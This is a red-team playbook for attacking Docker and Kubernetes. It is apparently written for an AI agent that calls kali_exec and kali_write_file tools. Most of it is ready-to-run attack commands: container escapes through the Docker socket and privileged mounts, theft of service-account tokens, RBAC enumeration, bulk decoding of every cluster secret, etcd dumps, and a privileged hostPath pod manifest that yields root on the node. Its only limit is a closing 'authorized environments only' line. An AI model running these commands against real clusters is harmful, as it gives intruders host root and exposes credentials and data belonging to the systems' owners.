# PLAYBOOK: Container & Kubernetes Security
# April 2026 Red Team Stack
# Docker · Kubernetes · Helm · Service Mesh

---

## Container Attack Surface

```
ENTRY POINTS:
  Exposed Docker socket (/var/run/docker.sock)
  Exposed Kubernetes API (port 6443/8443)
  Container escape (privileged, capabilities, namespaces)
  Image vulnerabilities (CVEs in base images)
  Secrets in environment variables / ConfigMaps
  
LATERAL MOVEMENT:
  RBAC misconfigurations
  ServiceAccount token abuse
  Network policy gaps
  Node-to-pod privilege escalation
```

---

## PHASE 1 — DOCKER RECONNAISSANCE

```bash
# Check for exposed Docker socket (CRITICAL if found)
kali_exec("ls -la /var/run/docker.sock 2>/dev/null && echo 'SOCKET EXPOSED'")
kali_exec("curl -s --unix-socket /var/run/docker.sock http://localhost/version")

# If socket accessible — instant container escape:
kali_exec("curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"chroot\",\"/host\",\"/bin/sh\"],\"Binds\":[\"/:/host\"],\"Privileged\":true}'")

# Docker API exposed on network (port 2375/2376)
kali_exec("nmap -p 2375,2376 [TARGET_IP] --open")
kali_exec("docker -H tcp://[TARGET_IP]:2375 info")
kali_exec("docker -H tcp://[TARGET_IP]:2375 run -v /:/mnt alpine chroot /mnt sh")
```

---

## PHASE 2 — CONTAINER ESCAPE TECHNIQUES

### Privileged Container Escape
```bash
# Check if we're in a privileged container
kali_exec("cat /proc/self/status | grep CapEff")
# If CapEff = full (0000003fffffffff) → privileged

# Mount host filesystem
kali_exec("fdisk -l")  # Find host disk (e.g., /dev/sda1)
kali_exec("mkdir /mnt/host && mount /dev/sda1 /mnt/host")
kali_exec("chroot /mnt/host bash")
# Now operating as root on HOST

# Alternative: cgroups escape (CVE-2019-5736 style)
kali_exec("cat /proc/1/cgroup")
```

### Docker Socket in Container
```bash
# If /var/run/docker.sock is mounted inside container
kali_exec("ls /var/run/docker.sock")
kali_exec("docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
```

### Capabilities Abuse
```bash
# Check capabilities
kali_exec("capsh --print")
kali_exec("cat /proc/self/status | grep Cap")

# CAP_SYS_ADMIN → many escape paths
# CAP_NET_ADMIN → network sniffing, ARP poisoning
# CAP_DAC_READ_SEARCH → read any file (openat2 exploit)
# CAP_SYS_PTRACE → trace and inject host processes

# Example: CAP_DAC_READ_SEARCH exploit (Shocker)
kali_exec("find / -name docker.sock 2>/dev/null")
```

---

## PHASE 3 — KUBERNETES RECONNAISSANCE

```bash
# Check if we're in a K8s pod
kali_exec("ls /var/run/secrets/kubernetes.io/serviceaccount/")
kali_exec("cat /var/run/secrets/kubernetes.io/serviceaccount/token")
kali_exec("cat /var/run/secrets/kubernetes.io/serviceaccount/namespace")

# K8s API from pod using default ServiceAccount
kali_exec("APISERVER=https://kubernetes.default.svc && TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt && curl -s --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" $APISERVER/api/v1/namespaces")

# External: Discover exposed K8s API
kali_exec("nmap -p 6443,8443 [TARGET_RANGE] --open")
kali_exec("curl -k https://[K8S_API]:6443/api/v1/namespaces")
# Anonymous access? → CRITICAL
```

---

## PHASE 4 — KUBERNETES RBAC ABUSE

```bash
# With kubectl access (kubeconfig or token)
# Check what we can do
kali_exec("kubectl auth can-i --list")
kali_exec("kubectl auth can-i --list --namespace=kube-system")

# Enumerate everything we can see
kali_exec("kubectl get all --all-namespaces 2>/dev/null")
kali_exec("kubectl get secrets --all-namespaces 2>/dev/null")
kali_exec("kubectl get configmaps --all-namespaces 2>/dev/null")

# List ServiceAccounts
kali_exec("kubectl get serviceaccounts --all-namespaces")

# RBAC rules — find overpermissioned roles
kali_exec("kubectl get clusterrolebindings -o json | python3 -c \"import sys,json; [print(rb['metadata']['name'], [(s.get('name',''), s.get('kind','')) for s in rb.get('subjects',[])]) for rb in json.load(sys.stdin)['items'] if any(r.get('verbs')==['*'] for r in rb.get('roleRef',{}).get('rules',[]))]\" 2>/dev/null")

# Check for wildcard permissions
kali_exec("kubectl get clusterrole [ROLE_NAME] -o yaml | grep -A5 'verbs'")
```

---

## PHASE 5 — SECRETS EXTRACTION

```bash
# Kubernetes Secrets (base64 encoded, not encrypted by default)
kali_exec("kubectl get secrets -A -o json | python3 -c \"import sys,json,base64; secrets=json.load(sys.stdin); [print(f['metadata']['namespace'], f['metadata']['name'], {k: base64.b64decode(v).decode() for k,v in f.get('data',{}).items()}) for f in secrets['items']]\"")

# Environment variables (may contain DB passwords, API keys)
kali_exec("kubectl get pods -A -o json | python3 -c \"import sys,json; pods=json.load(sys.stdin); [print(p['metadata']['name'], [(e.get('name',''), e.get('value','VALUEFRM_SECRET')) for c in p['spec'].get('containers',[]) for e in c.get('env',[])]) for p in pods['items']]\"")

# ConfigMaps (often contain connection strings)
kali_exec("kubectl get configmaps -A -o yaml | grep -E 'password|secret|key|token|dsn|connection'")

# etcd (if accessible — contains ALL cluster secrets unencrypted)
kali_exec("ETCDCTL_API=3 etcdctl --endpoints=https://[ETCD_IP]:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get / --prefix --keys-only | head -50")
```

---

## PHASE 6 — AUTOMATED TOOLS

```bash
# Trivy — image vulnerability scanning
kali_exec("trivy image [IMAGE_NAME]:[TAG] --severity CRITICAL,HIGH --format json > loot/[MISSION]/containers/trivy_[IMAGE].json")

# Kube-bench — CIS benchmark
kali_exec("kube-bench run --targets master,node,etcd,policies --json > loot/[MISSION]/containers/kube-bench.json")

# Kube-hunter — K8s penetration testing
kali_exec("kube-hunter --remote [K8S_API_IP] --report json > loot/[MISSION]/containers/kube-hunter.json")

# Kubectl-who-can — find RBAC paths
kali_exec("kubectl-who-can create pods -n kube-system")
kali_exec("kubectl-who-can exec pods")
kali_exec("kubectl-who-can get secrets -n kube-system")

# Deepce — container escape detection
kali_exec("./deepce.sh --no-banner 2>/dev/null")
```

---

## PHASE 7 — POST-EXPLOITATION IN K8S

```bash
# Create privileged pod for node escape (if create pods permission)
kali_write_file("/tmp/escape_pod.yaml", """
apiVersion: v1
kind: Pod
metadata:
  name: escape
  namespace: default
spec:
  hostPID: true
  hostIPC: true
  hostNetwork: true
  containers:
  - name: escape
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
""")
kali_exec("kubectl apply -f /tmp/escape_pod.yaml")
kali_exec("kubectl exec -it escape -- chroot /host bash")
# Now operating as root on K8s node
# Clean up: kubectl delete pod escape
```

---

## Container Security Quick Reference

```bash
# Am I in a container?
cat /.dockerenv && echo "In Docker"
cat /proc/1/cgroup | grep -i 'docker\|kube\|lxc'

# Container info
hostname
cat /etc/os-release
printenv | grep -E 'KUBERNETES|K8S'

# Network
ip addr; route -n
cat /etc/resolv.conf  # .cluster.local = Kubernetes
iptables -L 2>/dev/null

# Capabilities check
capsh --print 2>/dev/null || cat /proc/self/status | grep Cap

# Check for docker socket
ls /var/run/docker.sock /run/docker.sock 2>/dev/null

# Check cgroups v1 escape
cat /proc/1/cgroup | head -1
find /sys/fs/cgroup -writable 2>/dev/null | head -5
```

---

*April 2026 | Container/K8s testing — authorized environments only*
